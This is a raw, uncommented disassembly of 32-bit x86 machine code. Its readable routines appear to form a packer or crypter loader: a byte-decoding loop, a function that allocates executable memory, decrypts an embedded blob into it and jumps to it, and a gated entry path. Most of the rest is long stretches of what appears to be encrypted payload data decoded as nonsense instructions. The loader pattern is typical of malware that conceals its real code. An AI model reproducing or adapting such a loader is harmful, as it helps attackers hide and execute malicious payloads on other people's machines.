  421457:	das    
  421458:	pop    es
  421459:	leave  
  42145a:	sbb    DWORD PTR [ebx+edx*2+0x1e],0x6b
  42145f:	push   ds
  421460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421461:	xor    ebp,DWORD PTR [esi+0x4f]
  421464:	push   edx
  421465:	call   0x515c:0x4b471abb
  42146c:	and    edx,DWORD PTR [edi-0x3253f9f3]
  421472:	dec    edi
  421473:	mov    WORD PTR [edx-0x1be257d5],ss
  421479:	jle    0x42141d
  42147b:	and    DWORD PTR [edi],eax
  42147d:	add    esi,DWORD PTR [ebx+0x34615e18]
  421483:	adc    ebx,DWORD PTR [ebx-0x79186c79]
  421489:	push   ebp
  42148a:	ins    BYTE PTR es:[edi],dx
  42148b:	sbb    ch,BYTE PTR [edx+0x62]
  42148e:	mov    dl,0x51
  421490:	sbb    esi,ebx
  421492:	sub    bh,ch
  421494:	sbb    al,0x79
  421496:	push   0x51
  421498:	add    eax,0x6ccccb61
  42149d:	sahf   
  42149e:	or     al,0x88
  4214a0:	inc    eax
  4214a1:	push   ebp
  4214a2:	mov    ah,0xf2
  4214a4:	iret   
  4214a5:	push   es
  4214a6:	pop    ebp
  4214a7:	push   ebp
  4214a8:	push   cs
  4214a9:	mov    ds:0x15d45653,al
  4214ae:	xor    DWORD PTR [edi-0x69],eax
  4214b1:	add    eax,esp
  4214b3:	xor    BYTE PTR [esi],ch
  4214b5:	dec    esi
  4214b6:	and    eax,0x6ab1f21
  4214bb:	xchg   edi,eax
  4214bc:	adc    ebp,DWORD PTR [edi]
  4214be:	enter  0x8fd0,0x71
  4214c2:	pop    edx
  4214c3:	sub    BYTE PTR [ebx+0x14dfbd6c],ch
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	lea    ecx,[ebp-0x14]
  42165c:	push   ecx
  42165d:	call   DWORD PTR ds:0x428004
  421663:	mov    BYTE PTR [ebp-0x40],0x56
  421667:	call   DWORD PTR ds:0x428014
  42166d:	mov    DWORD PTR [ebp-0x2c],eax
  421670:	mov    BYTE PTR [ebp-0x3e],0x72
  421674:	movzx  edx,WORD PTR [ebp-0x2c]
  421678:	test   edx,edx
  42167a:	jne    0x4216bc
  42167c:	mov    BYTE PTR [ebp-0x34],0x0
  421680:	mov    DWORD PTR [ebp-0x14],0xe0d
  421687:	lea    eax,[ebp-0x28]
  42168a:	push   eax
  42168b:	call   DWORD PTR ds:0x428018
  421691:	mov    DWORD PTR [ebp-0x68],eax
  421694:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169b:	lea    ecx,[ebp-0x40]
  42169e:	push   ecx
  42169f:	mov    edx,DWORD PTR [ebp-0x68]
  4216a2:	push   edx
  4216a3:	call   DWORD PTR ds:0x42801c
  4216a9:	mov    DWORD PTR [ebp-0x44],eax
  4216ac:	mov    DWORD PTR [ebp-0x8],0x51b6f75f
  4216b3:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ba:	jmp    0x4216d1
  4216bc:	mov    BYTE PTR ds:0x443a58,0x0
  4216c3:	mov    BYTE PTR ds:0x42bb88,0x0
  4216ca:	mov    BYTE PTR ds:0x441b18,0x0
  4216d1:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216d8:	push   DWORD PTR ds:0x428018
  4216de:	pop    edx
  4216df:	mov    DWORD PTR [ebp-0x74],edx
  4216e2:	push   DWORD PTR [ebp-0x30]
  4216e5:	push   0x1000
  4216ea:	mov    eax,DWORD PTR [ebp-0x14]
  4216ed:	add    eax,0x23
  4216f0:	add    eax,0x23
  4216f3:	push   eax
  4216f4:	xor    eax,eax
  4216f6:	push   eax
  4216f7:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fa:	call   ecx
  4216fc:	mov    edx,eax
  4216fe:	mov    DWORD PTR [ebp-0x4],edx
  421701:	mov    eax,DWORD PTR [ebp-0x70]
  421704:	sub    eax,0xdae0b
  421709:	mov    DWORD PTR [ebp-0x70],eax
  42170c:	cmp    DWORD PTR [ebp-0x4],0x0
  421710:	jne    0x421719
  421712:	mov    BYTE PTR ds:0x441b18,0x0
  421719:	mov    ecx,DWORD PTR [ebp-0x4]
  42171c:	add    ecx,DWORD PTR [ebp-0x14]
  42171f:	mov    edx,DWORD PTR [ebp-0x8]
  421722:	mov    DWORD PTR [ecx],edx
  421724:	mov    eax,DWORD PTR [ebp-0x4]
  421727:	add    eax,DWORD PTR [ebp-0x5c]
  42172a:	mov    DWORD PTR [ebp-0x64],eax
  42172d:	mov    ecx,DWORD PTR ds:0x42801c
  421733:	mov    DWORD PTR [ebp-0x54],ecx
  421736:	mov    edx,DWORD PTR [ebp-0x4]
  421739:	add    edx,DWORD PTR [ebp-0x14]
  42173c:	mov    eax,DWORD PTR [ebp+0x8]
  42173f:	mov    DWORD PTR [edx+0x4],eax
  421742:	mov    ecx,DWORD PTR [ebp-0x4]
  421745:	add    ecx,DWORD PTR [ebp-0x14]
  421748:	mov    DWORD PTR [ebp-0xc],ecx
  42174b:	cmp    DWORD PTR [ebp-0x70],0x0
  42174f:	jbe    0x42176c
  421751:	mov    edx,DWORD PTR [ebp-0xc]
  421754:	push   edx
  421755:	mov    eax,DWORD PTR [ebp-0x14]
  421758:	push   eax
  421759:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175c:	add    ecx,DWORD PTR [ebp-0x70]
  42175f:	push   ecx
  421760:	mov    edx,DWORD PTR [ebp-0x4]
  421763:	push   edx
  421764:	call   0x4214d0
  421769:	add    esp,0x10
  42176c:	cmp    DWORD PTR [ebp-0x64],0x0
  421770:	je     0x421784
  421772:	mov    ecx,DWORD PTR [ebp-0x54]
  421775:	push   ecx
  421776:	push   DWORD PTR [ebp-0x74]
  421779:	mov    esi,DWORD PTR [ebp-0x64]
  42177c:	push   edx
  42177d:	pop    eax
  42177e:	push   ecx
  42177f:	nop
  421780:	jmp    esi
  421782:	jmp    0x42178a
  421784:	mov    eax,DWORD PTR [ebp+0x8]
  421787:	mov    DWORD PTR [ebp-0x18],eax
  42178a:	mov    eax,0x1
  42178f:	pop    esi
  421790:	mov    esp,ebp
  421792:	pop    ebp
  421793:	ret    
  421794:	int3   
  421795:	int3   
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x8b60a091
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	call   DWORD PTR [eax]
  42182f:	dec    esi
  421830:	sbb    edi,esi
  421832:	and    bl,cl
  421834:	pop    ss
  421835:	xchg   ecx,eax
  421836:	sar    DWORD PTR [ecx+0x7d],cl
  421839:	rcl    ebx,cl
  42183b:	mov    ds:0x214f8914,al
  421840:	fst    DWORD PTR [edi]
  421842:	xchg   ecx,eax
  421843:	xlat   BYTE PTR ds:[ebx]
  421844:	jns    0x4218c3
  421846:	xchg   ebx,eax
  421847:	sub    al,0x5d
  421849:	adc    al,0x89
  42184b:	mul    DWORD PTR [ecx]
  42184d:	fst    DWORD PTR [edi]
  42184f:	xchg   ecx,eax
  421850:	xlat   BYTE PTR ds:[ebx]
  421851:	jns    0x4218d0
  421853:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  42185a:	fst    DWORD PTR [edi]
  42185c:	xchg   ecx,eax
  42185d:	xlat   BYTE PTR ds:[ebx]
  42185e:	jns    0x4218dd
  421860:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421867:	fst    DWORD PTR [edi]
  421869:	xchg   ecx,eax
  42186a:	das    
  42186b:	jns    0x4218ea
  42186d:	shl    DWORD PTR [edx],cl
  42186f:	inc    edx
  421870:	scas   al,BYTE PTR es:[edi]
  421871:	xchg   edi,esi
  421873:	xchg   ebp,eax
  421874:	rcr    dl,1
  421876:	mov    al,0x6f
  421878:	js     0x4218ab
  42187a:	push   ds
  42187b:	or     eax,0x84e07c09
  421880:	add    DWORD PTR [ecx+0xbb0fe65],ebp
  421886:	sbb    al,0xbe
  421888:	or     al,0x3e
  42188a:	jne    0x421873
  42188c:	cdq    
  42188d:	dec    esi
  42188e:	lods   eax,DWORD PTR ds:[esi]
  42188f:	aaa    
  421890:	repz mov dl,0x59
  421893:	montmul (bad)
  421894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421895:	inc    edx
  421896:	jge    0x421915
  421898:	out    0xd7,eax
  42189a:	gs xchg esi,eax
  42189c:	inc    esp
  42189d:	mov    cl,0xba
  42189f:	push   ss
  4218a0:	sbb    DWORD PTR [esi-0x7ce6affe],esi
  4218a6:	shl    DWORD PTR [ecx],cl
  4218a8:	fst    DWORD PTR [edi]
  4218aa:	xchg   ecx,eax
  4218ab:	xlat   BYTE PTR ds:[ebx]
  4218ac:	jns    0x42192b
  4218ae:	aam    0xb5
  4218b0:	mov    eax,ds:0xb30fca4d
  4218b5:	rcl    DWORD PTR [ecx+ebp*2+0x45],cl
  4218b9:	jae    0x4218f9
  4218bb:	sub    edi,DWORD PTR [esi-0x413b3a9]
  4218c1:	sub    eax,DWORD PTR [esi+0x21dd03ef]
  4218c7:	sbb    bl,ch
  4218c9:	es lahf 
  4218cb:	in     al,dx
  4218cc:	sbb    edi,ebp
  4218ce:	jns    0x42188c
  4218d0:	cs fwait
  4218d2:	mov    edi,0xd9ef81
  4218d7:	shr    DWORD PTR ds:0x4bd9b183,cl
  4218dd:	sbb    eax,0x776857db
  4218e2:	cdq    
  4218e3:	aam    0xcf
  4218e5:	push   ds
  4218e6:	ret    
  4218e7:	ja     0x421909
  4218e9:	ror    DWORD PTR [edi+0x69],cl
  4218ec:	inc    ebp
  4218ed:	jae    0x42192d
  4218ef:	sub    edi,DWORD PTR [edi+0x65703c57]
  4218f5:	sub    esp,DWORD PTR [esi-0x31]
  4218f8:	adc    ebp,ebx
  4218fa:	xor    al,0x85
  4218fc:	inc    ecx
  4218fd:	es add eax,0x29fdb471
  421903:	and    DWORD PTR [ebp+0x751c8f9b],eax
  421909:	fldcw  WORD PTR [esi-0x5b]
  42190c:	xchg   BYTE PTR [ebx+0x1dd644af],al
  421912:	shr    DWORD PTR [edi],cl
  421914:	jmp    0x42198d
  421916:	add    DWORD PTR [ebp+0x3e],0xb30fca7c
  42191d:	rcl    DWORD PTR [edi],cl
  42191f:	xchg   ecx,eax
  421920:	xlat   BYTE PTR ds:[ebx]
  421921:	jns    0x4219a0
  421923:	shr    DWORD PTR [ebx*2+0x21f7cc44],cl
  42192a:	xchg   ebp,eax
  42192b:	push   ss
  42192c:	xchg   ebx,eax
  42192d:	xlat   BYTE PTR ds:[ebx]
  42192e:	fldcw  WORD PTR [ebp+0x145d63b8]
  421934:	mov    edi,esi
  421936:	and    ecx,ebx
  421938:	pop    ss
  421939:	xchg   ecx,eax
  42193a:	aaa    
  42193b:	jns    0x4219bb
  42193d:	shl    BYTE PTR [edi],cl
  42193f:	pop    esp
  421940:	push   ds
  421941:	mov    edi,esi
  421943:	iret   
  421944:	fst    QWORD PTR [edi]
  421946:	xchg   ecx,eax
  421947:	imul   edi,DWORD PTR [edi+0x7d],0xffffffd3
  42194b:	sub    al,0x5d
  42194d:	adc    al,0x98
  42194f:	dec    edx
  421950:	and    ecx,ebx
  421952:	pop    ss
  421953:	adc    edi,0x29d37d79
  421959:	pop    ebp
  42195a:	adc    al,0x89
  42195c:	mov    dh,0x21
  42195e:	fld    DWORD PTR [edi]
  421960:	xchg   ecx,eax
  421961:	xlat   BYTE PTR ds:[ebx]
  421962:	jns    0x4219e3
  421964:	shr    DWORD PTR [eax+ebx*2],cl
  421967:	adc    al,0x88
  421969:	mul    DWORD PTR [ecx]
  42196b:	fst    DWORD PTR [edi]
  42196d:	xchg   ecx,eax
  42196e:	sar    BYTE PTR [ecx+0x7c],cl
  421971:	shr    DWORD PTR [ebx*2+0x71f78914],cl
  421978:	aad    0x17
  42197a:	xchg   ecx,eax
  42197b:	sar    DWORD PTR [ecx+0x7d],cl
  42197e:	ror    al,cl
  421980:	pop    eax
  421981:	adc    al,0x8b
  421983:	mul    DWORD PTR [ecx]
  421985:	pop    ecx
  421986:	pop    ss
  421987:	xchg   ecx,eax
  421988:	(bad)  
  421989:	jns    0x421a08
  42198b:	ret    
  42198c:	sub    al,0x5d
  42198e:	adc    al,0x89
  421990:	out    0x21,eax
  421992:	fld    DWORD PTR [edi]
  421994:	xchg   ecx,eax
  421995:	xlat   BYTE PTR ds:[ebx]
  421996:	jns    0x421a15
  421998:	shr    DWORD PTR [ecx*2+0x21f78914],cl
  42199f:	fst    DWORD PTR [edi]
  4219a1:	xchg   ecx,eax
  4219a2:	xlat   BYTE PTR ds:[ebx]
  4219a3:	jns    0x421a22
  4219a5:	rcr    eax,cl
  4219a7:	sbb    BYTE PTR fs:[ecx+0x17d9229e],cl
  4219ae:	xchg   ecx,eax
  4219af:	daa    
  4219b0:	jb     0x421a2f
  4219b2:	pushf  
  4219b3:	gs pop ebp
  4219b5:	adc    al,0x89
  4219b7:	mul    DWORD PTR [ecx]
  4219b9:	fst    DWORD PTR [edi]
  4219bb:	xchg   ecx,eax
  4219bc:	xlat   BYTE PTR ds:[ebx]
  4219bd:	jns    0x421a3c
  4219bf:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  4219c6:	fst    DWORD PTR [edi]
  4219c8:	xchg   ecx,eax
  4219c9:	xlat   BYTE PTR ds:[ebx]
  4219ca:	jns    0x421a49
  4219cc:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  4219d3:	fst    DWORD PTR [edi]
  4219d5:	xchg   ecx,eax
  4219d6:	xlat   BYTE PTR ds:[ebx]
  4219d7:	jns    0x421a56
  4219d9:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  4219e0:	fst    DWORD PTR [edi]
  4219e2:	xchg   ecx,eax
  4219e3:	xlat   BYTE PTR ds:[ebx]
  4219e4:	jns    0x421a63
  4219e6:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  4219ed:	fst    DWORD PTR [edi]
  4219ef:	xchg   ecx,eax
  4219f0:	xlat   BYTE PTR ds:[ebx]
  4219f1:	jns    0x421a70
  4219f3:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  4219fa:	fst    DWORD PTR [edi]
  4219fc:	xchg   ecx,eax
  4219fd:	xlat   BYTE PTR ds:[ebx]
  4219fe:	jns    0x421a7d
  421a00:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421a07:	fst    DWORD PTR [edi]
  421a09:	xchg   ecx,eax
  421a0a:	xlat   BYTE PTR ds:[ebx]
  421a0b:	jns    0x421a8a
  421a0d:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421a14:	fst    DWORD PTR [edi]
  421a16:	xchg   ecx,eax
  421a17:	xlat   BYTE PTR ds:[ebx]
  421a18:	jns    0x421a97
  421a1a:	shr    DWORD PTR [ebx*2+0x4483a714],cl
  421a21:	mov    eax,ds:0x79d79163
  421a26:	jge    0x421a5b
  421a28:	daa    
  421a29:	pop    ebp
  421a2a:	adc    al,0x99
  421a2c:	mul    DWORD PTR [ecx]
  421a2e:	fld    st(3)
  421a30:	xchg   ebp,eax
  421a31:	xlat   BYTE PTR ds:[ebx]
  421a32:	jns    0x421aad
  421a34:	shr    DWORD PTR [ecx*1+0x75c5ca51],cl
  421a3b:	xchg   esi,eax
  421a3c:	pop    ss
  421a3d:	xchg   ecx,eax
  421a3e:	xlat   BYTE PTR ds:[ebx]
  421a3f:	jns    0x421abe
  421a41:	ror    DWORD PTR [ebx*2+0x53d96914],cl
  421a48:	stos   BYTE PTR es:[edi],al
  421a49:	repnz xlat BYTE PTR gs:[ebx]
  421a4c:	jns    0x421acb
  421a4e:	ror    DWORD PTR [ebp+ebx*2+0x14],cl
  421a52:	mov    DWORD PTR [edi],eax
  421a54:	sub    bl,cl
  421a56:	pop    ss
  421a57:	retf   
  421a58:	xlat   BYTE PTR ds:[ebx]
  421a59:	jns    0x421ad8
  421a5b:	or     ebp,DWORD PTR [eax]
  421a5d:	pop    ebp
  421a5e:	adc    al,0x89
  421a60:	mul    DWORD PTR [ecx]
  421a62:	fst    DWORD PTR [edi]
  421a64:	xchg   ecx,eax
  421a65:	xlat   BYTE PTR ds:[ebx]
  421a66:	jns    0x421ae5
  421a68:	shr    DWORD PTR [edi*2+0x21178914],cl
  421a6f:	fst    DWORD PTR [edi]
  421a71:	xchg   ecx,eax
  421a72:	xlat   BYTE PTR ds:[ebx]
  421a73:	jns    0x421af2
  421a75:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421a7c:	fst    DWORD PTR [edi]
  421a7e:	xchg   ecx,eax
  421a7f:	xlat   BYTE PTR ds:[ebx]
  421a80:	jns    0x421aff
  421a82:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421a89:	fst    DWORD PTR [edi]
  421a8b:	xchg   ecx,eax
  421a8c:	xlat   BYTE PTR ds:[ebx]
  421a8d:	jns    0x421b0c
  421a8f:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421a96:	fst    DWORD PTR [edi]
  421a98:	xchg   ecx,eax
  421a99:	xlat   BYTE PTR ds:[ebx]
  421a9a:	jns    0x421b19
  421a9c:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421aa3:	fst    DWORD PTR [edi]
  421aa5:	xchg   ecx,eax
  421aa6:	xlat   BYTE PTR ds:[ebx]
  421aa7:	jns    0x421b26
  421aa9:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421ab0:	fst    DWORD PTR [edi]
  421ab2:	xchg   ecx,eax
  421ab3:	xlat   BYTE PTR ds:[ebx]
  421ab4:	jns    0x421b33
  421ab6:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421abd:	fst    DWORD PTR [edi]
  421abf:	xchg   ecx,eax
  421ac0:	xlat   BYTE PTR ds:[ebx]
  421ac1:	jns    0x421b40
  421ac3:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421aca:	fst    DWORD PTR [edi]
  421acc:	xchg   ecx,eax
  421acd:	xlat   BYTE PTR ds:[ebx]
  421ace:	jns    0x421b4d
  421ad0:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421ad7:	fst    DWORD PTR [edi]
  421ad9:	xchg   ecx,eax
  421ada:	xlat   BYTE PTR ds:[ebx]
  421adb:	jns    0x421b5a
  421add:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421ae4:	fst    DWORD PTR [edi]
  421ae6:	xchg   ecx,eax
  421ae7:	xlat   BYTE PTR ds:[ebx]
  421ae8:	jns    0x421b67
  421aea:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421af1:	fst    DWORD PTR [edi]
  421af3:	xchg   ecx,eax
  421af4:	xlat   BYTE PTR ds:[ebx]
  421af5:	jns    0x421b74
  421af7:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421afe:	fst    DWORD PTR [edi]
  421b00:	xchg   ecx,eax
  421b01:	xlat   BYTE PTR ds:[ebx]
  421b02:	jns    0x421b81
  421b04:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b0b:	fst    DWORD PTR [edi]
  421b0d:	xchg   ecx,eax
  421b0e:	xlat   BYTE PTR ds:[ebx]
  421b0f:	jns    0x421b8e
  421b11:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b18:	fst    DWORD PTR [edi]
  421b1a:	xchg   ecx,eax
  421b1b:	xlat   BYTE PTR ds:[ebx]
  421b1c:	jns    0x421b9b
  421b1e:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b25:	fst    DWORD PTR [edi]
  421b27:	xchg   ecx,eax
  421b28:	xlat   BYTE PTR ds:[ebx]
  421b29:	jns    0x421ba8
  421b2b:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b32:	fst    DWORD PTR [edi]
  421b34:	xchg   ecx,eax
  421b35:	xlat   BYTE PTR ds:[ebx]
  421b36:	jns    0x421bb5
  421b38:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b3f:	fst    DWORD PTR [edi]
  421b41:	xchg   ecx,eax
  421b42:	xlat   BYTE PTR ds:[ebx]
  421b43:	jns    0x421bc2
  421b45:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b4c:	fst    DWORD PTR [edi]
  421b4e:	xchg   ecx,eax
  421b4f:	xlat   BYTE PTR ds:[ebx]
  421b50:	jns    0x421bcf
  421b52:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b59:	fst    DWORD PTR [edi]
  421b5b:	xchg   ecx,eax
  421b5c:	xlat   BYTE PTR ds:[ebx]
  421b5d:	jns    0x421bdc
  421b5f:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b66:	fst    DWORD PTR [edi]
  421b68:	xchg   ecx,eax
  421b69:	xlat   BYTE PTR ds:[ebx]
  421b6a:	jns    0x421be9
  421b6c:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b73:	fst    DWORD PTR [edi]
  421b75:	xchg   ecx,eax
  421b76:	xlat   BYTE PTR ds:[ebx]
  421b77:	jns    0x421bf6
  421b79:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b80:	fst    DWORD PTR [edi]
  421b82:	xchg   ecx,eax
  421b83:	xlat   BYTE PTR ds:[ebx]
  421b84:	jns    0x421c03
  421b86:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b8d:	fst    DWORD PTR [edi]
  421b8f:	xchg   ecx,eax
  421b90:	xlat   BYTE PTR ds:[ebx]
  421b91:	jns    0x421c10
  421b93:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421b9a:	fst    DWORD PTR [edi]
  421b9c:	xchg   ecx,eax
  421b9d:	xlat   BYTE PTR ds:[ebx]
  421b9e:	jns    0x421c1d
  421ba0:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421ba7:	fst    DWORD PTR [edi]
  421ba9:	xchg   ecx,eax
  421baa:	xlat   BYTE PTR ds:[ebx]
  421bab:	jns    0x421c2a
  421bad:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421bb4:	fst    DWORD PTR [edi]
  421bb6:	xchg   ecx,eax
  421bb7:	xlat   BYTE PTR ds:[ebx]
  421bb8:	jns    0x421c37
  421bba:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421bc1:	fst    DWORD PTR [edi]
  421bc3:	xchg   ecx,eax
  421bc4:	xlat   BYTE PTR ds:[ebx]
  421bc5:	jns    0x421c44
  421bc7:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421bce:	fst    DWORD PTR [edi]
  421bd0:	xchg   ecx,eax
  421bd1:	xlat   BYTE PTR ds:[ebx]
  421bd2:	jns    0x421c51
  421bd4:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421bdb:	fst    DWORD PTR [edi]
  421bdd:	xchg   ecx,eax
  421bde:	xlat   BYTE PTR ds:[ebx]
  421bdf:	jns    0x421c5e
  421be1:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421be8:	fst    DWORD PTR [edi]
  421bea:	xchg   ecx,eax
  421beb:	xlat   BYTE PTR ds:[ebx]
  421bec:	jns    0x421c6b
  421bee:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421bf5:	fst    DWORD PTR [edi]
  421bf7:	xchg   ecx,eax
  421bf8:	xlat   BYTE PTR ds:[ebx]
  421bf9:	jns    0x421c78
  421bfb:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421c02:	fst    DWORD PTR [edi]
  421c04:	xchg   ecx,eax
  421c05:	xlat   BYTE PTR ds:[ebx]
  421c06:	jns    0x421c85
